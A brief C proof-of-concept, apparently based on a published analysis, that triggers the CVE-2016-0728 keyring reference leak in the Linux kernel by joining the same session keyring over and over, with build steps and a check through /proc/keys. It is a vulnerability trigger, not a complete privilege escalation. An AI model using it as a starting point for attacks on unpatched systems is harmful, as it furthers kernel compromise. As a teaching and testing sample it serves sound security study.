/* 
    https://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
    if ubuntu: install libkeyutils-dev
    $ gcc leak.c -o leak -lkeyutils -Wall
    $ ./leak 
    $ cat /proc/keys  
*/

#include <stddef.h>
#include <stdio.h>
#include <sys/types.h>
#include <keyutils.h>

int main(int argc, const char *argv[]){
    int i = 0;
    key_serial_t serial;

    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }

    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL) < 0) {
        perror("keyctl");
        return -1;
    }

    for (i = 0; i < 42; i++) {
        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
        if (serial < 0) {
            perror("keyctl");
            return -1;
        }
    }
    perror("end");
    return 0;
}
